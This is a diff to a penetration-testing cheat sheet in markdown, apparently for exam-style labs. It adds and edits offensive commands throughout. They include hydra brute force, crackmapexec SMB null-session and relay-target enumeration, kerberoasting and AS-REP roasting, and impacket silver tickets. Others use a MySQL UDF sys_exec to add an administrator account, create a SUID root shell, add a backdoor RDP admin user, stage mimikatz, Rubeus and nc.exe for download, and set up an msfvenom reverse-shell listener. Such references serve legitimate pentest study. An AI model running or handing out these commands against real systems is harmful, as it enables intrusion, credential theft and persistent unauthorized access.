@@ -645,7 +645,8 @@ HTTP BasicAuth (GET request):
 ```bash
 # hydra http basic auth brute force
 # Use https-get for https
-hydra -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC"
+# '-u' loops users before moving onto next password
+hydra -u -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC"
 ```
 
 CSRF Tokens defeat hydra, so use `patator`: (documentation in [`patator.py`](https://github.com/lanjelot/patator/blob/master/patator.py))
@@ -1489,8 +1490,18 @@ SMB Scans:
 
 ```sh
 # get netbios names of computers, and usernames
+crackmapexec smb VICTIM_IP/24
 sudo nbtscan -r $VICTIM_IP/24 # force port 137, which Win95 hosts need to respond
 nbtscan $VICTIM_IP/24
+
+# check null sessions
+crackmapexec smb VICTIM_IP/24 -u '' -p ''
+
+# check guest login
+crackmapexec smb VICTIM_IP/24 -u 'guest' -p ''
+
+# enumerate hosts with SMB signing not required
+crackmapexec smb VICTIM_IP/24 --gen-relay-list ntlm-relayers.txt
 
 # basic SMB scan, smbmap
 smbmap -H $VICTIM_IP
@@ -1519,6 +1530,9 @@ nmap --script="safe and smb-*" -n -v -p 139,445 $VICTIM_IP
 Listing SMB Shares:
 
 ```bash
+# enumerate readable/writable shares on multiple IPs with/without credentials
+crackmapexec smb VICTIM_IPS -u USERNAME -p 'PASSWORD' --shares --filter-shares READ WRITE
+
 # list available shares using smbmap (no creds)
 smbmap -H $VICTIM_IP
 
@@ -1543,6 +1557,9 @@ smbmap -u "username" -p "<LM>:<NT>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pa
 Listing SMB Shares from Windows:
 
 ```powershell
+# view shares on local host
+net share
+
 # /all lets us see administrative shares (ending in '$').
 # Can use IP or hostname to specify host.
 net view \\VICTIM /all
@@ -1879,16 +1896,16 @@ Using interactive session:
 ```sql
 -- Check if you have server admin rights to enable command execution:
 -- Returns 1 if admin
-SELECT IS_SRVROLEMEMBER('sysadmin');
+select is_srvrolemember('sysadmin');
 go
 
 -- Check if already enabled
 -- check if xp_cmdshell is enabled
-SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS CMDSHELL_ENABLED FROM sys.configurations WHERE name = N'xp_cmdshell';
+select convert(int, isnull(value, value_in_use)) as cmdshell_enabled from sys.configurations where name = n'xp_cmdshell';
 go
 
 -- turn on advanced options; needed to configure xp_cmdshell
-exec sp_configure 'show advanced options', 1;RECONFIGURE;
+exec sp_configure 'show advanced options', 1;reconfigure;
 go
 
 -- enable xp_cmdshell
@@ -2055,7 +2072,7 @@ In MySQL terminal:
 
 ```sql
 -- checking permissions
-select * from mysql.user where user = substring_index(user(), '@', 1) ;
+select * from mysql.user where user = substring_index(user(), '@', 1);
 -- checking architecture
 select @@version_compile_os, @@version_compile_machine;
 -- or
@@ -2077,15 +2094,15 @@ select sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 -- then start local shell with `/tmp/rootbash -p` to get root
 
 -- Windows
-USE mysql;
-CREATE TABLE npn(line blob);
-INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));
-SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
+use mysql;
+create table npn(line blob);
+insert into npn values(load_files('c://temp//lib_mysqludf_sys_32.dll'));
+select * from mysql.npn into dumpfile 'c://windows//system32//lib_mysqludf_sys_32.dll';
 -- alternative: dump hex shellcode directly into file:
-select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys.so';
-CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
-SELECT sys_exec("net user hacker P@$$w0rd /add");
-SELECT sys_exec("net localgroup Administrators hacker /add");
+select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys_32.dll';
+create function sys_exec returns integer soname 'lib_mysqludf_sys_32.dll';
+select sys_exec("net user derp Herpderp1! /add");
+select sys_exec("net localgroup administrators derp /add");
 ```
 
 ### 2.17.2 Grabbing MySQL Passwords
@@ -2171,7 +2188,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 **Connect:**
 
 ```sh
-psql -U <myuser> # Open psql console with user
+psql -U <myuser> # Open psql console with user (default: postgres)
 psql -h <host> -U <username> -d <database> # Remote connection
 psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
 ```
@@ -3492,8 +3509,42 @@ There are several key pieces of information we should always obtain:
 Automate your enumeration with WinPEAS, etc.:
 
 ```sh
-# serve up copies of binaries to run on victim
-cp /usr/share/peass/winpeas/winPEASx64.exe .
+# WinPEAS for automated Windows enumeration
+wget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
+
+# PowerUp for Winodws privilege escalation
+cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .
+
+# PowerView for manual AD enumeration
+cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
+
+# SharpHound for automated AD enumeration
+cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .
+
+# sysinternals suite in case you need it
+wget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
+unzip -d sysinternals sysinternals.zip
+
+# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens
+cp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .
+cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
+wget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+unzip -d mimikatz mimikatz.zip
+
+# Rubeus.exe for AS-REP roasting, etc.
+wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+
+# chisel for port redirection/tunneling
+echo 'DOWNLOAD chisel!'
+echo 'https://github.com/jpillora/chisel/releases'
+
+# plink.exe for port redirection/tunneling
+cp /usr/share/windows-resources/binaries/plink.exe .
+
+# nc.exe for reverse/bind shells and port redirection
+cp /usr/share/windows-resources/binaries/nc.exe .
+
 # JAWS - invoke with: powershell -exec Bypass -File .\jaws-enum.ps1
 wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
 # https://github.com/GhostPack/Seatbelt
@@ -3501,7 +3552,9 @@ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seat
 # for older machines
 wget https://github.com/carlospolop/winPE/raw/master/binaries/accesschk-xp/accesschk-2003-xp.exe
 
-# start SMB server
+
+
+# host the files on a Windows 10+ compatible SMB share
 impacket-smbserver -smb2support -user derp -password herpderp share .
 
 # on windows host:
@@ -3552,11 +3605,11 @@ netsh firewall show state
 netsh firewall show config
 
 # Installed Software
-powershell -c "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | select displayname, DisplayVersion"
-powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion"
 dir /b/a:d "C:\Program files" "C:\Program Files (x86)" | sort /unique
 wmic product get name,version
 powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
+powershell -c "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | select displayname, DisplayVersion"
+powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion"
 
 # Processes
 tasklist
@@ -4261,6 +4314,9 @@ msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=LISTEN_
 
 # start a HTTP server to host the binaries
 python -m http.server 80
+
+# start reverse shell listener
+nc -lvnp 443
 
 # On windows, download and execute GodPotato with reverse shell
 cd C:\Users\Public
@@ -5087,9 +5143,9 @@ Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
 ### 4.6.1 Add RDP User
 
 ```powershell
-net user derp herpderp /add
+net user derp /add /passwordreq:no /y
 net localgroup Administrators derp /add
-net localgroup "Remote Desktop Users" derp /ADD
+net localgroup "Remote Desktop Users" derp /add
 # enable remote desktop / enable rdp
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 # delete user
@@ -5785,6 +5841,9 @@ Collecting hashes using AS-REP Roast attack:
 # push to stdout instead of file
 .\Rubeus.exe asreproast /nowrap
 
+# Kali: using crackmapexec
+crackmapexec ldap VICTIM -u USERNAME -p PASSWORD --asreproast asreproast.hash
+
 # Kali: use impacket (specify user info for authentication to DC)
 impacket-GetNPUsers -request -outputfile asreproast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
 ```
@@ -5832,6 +5891,9 @@ Invoke-Kerberoast | fl
 # Windows: using Rubeus
 # '/tgtdeleg' tries to downgrade encryption to RC4
 .\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash
+
+# Kali: use crackmapexec
+crackmapexec ldap VICTIM_IP -u harry -p pass --kerberoasting kerberoast.hash
 
 # Kali: use impacket
 impacket-GetUserSPNs -request -outputfile kerberoast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
@@ -5896,8 +5958,12 @@ kerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service
 # /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm
 .\Rubeus.exe silver /rc4:NTHASH /user:USERNAME /service:SPN /ldap /ptt [/altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm] [/nofullpacsig] [outfile:FILENAME]
 
+# Kali: get SIDs with crackmapexec
+crackmapexec ldap DC_FQDN -u USERNAME -p PASSWORD -k --get-sid
+
 # Kali: use impacket
 # Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)
+impacket-lookupsid DOMAIN/USERNAME:PASSWORD@VICTIM
 impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN -spn SERVICE/VICTIM_FQDN USERNAME
 export KRB5CCNAME=$(pwd)/USERNAME.ccache 
 impacket-psexec DOMAIN/USERNAME@VICTIM -k -no-pass
@@ -6945,7 +7011,7 @@ gcc exploit.c -o exploit # may need to compile locally with "-static"
 ./exploit # if statically compiled, may complain about system() failing, but might be ok
 
 # check if exploit worked
-grep root /etc/password # should see hash with 'aaron' salt
+grep root /etc/passwd # should see hash with 'aaron' salt
 
 # become r00t
 su - # use password 'aaron'
@@ -7225,6 +7291,7 @@ Uploading files via HTTP POST to `upload.php`:
 
 ```php
 <?php
+// File: upload.php
 // start php server from same directory as this file:
 // mkdir -p ../uploads && sudo php -S 0.0.0.0:80
   $parentdir = dirname(dirname(__FILE__));
@@ -7269,13 +7336,18 @@ If large files fail to upload properly, change the `php.ini` or `.user.ini` sett
 locate php.ini
 sudo vim /etc/php/7.4/apache2/php.ini
 # in php.ini, change the following:
-memory_limit = -1         # disable php memory limit
-upload_max_filesize = 10G # make it 10GiB
-post_max_size = 0         # make it unlimited
-max_execution_time = 120  # allow uploads to take 2 minutes
+[php]
+# disable php memory limit
+memory_limit = -1
+# make it 10GiB
+upload_max_filesize = 10G
+# make it unlimited
+post_max_size = 0
+# allow uploads to take 2 minutes
+max_execution_time = 120
 ```
 
-**Note:** The .user.ini file goes in your site’s document root.
+**Note:** The `.user.ini` file goes in your site’s document root.
 
 ### 7.2.4 PowerShell File Transfers
 
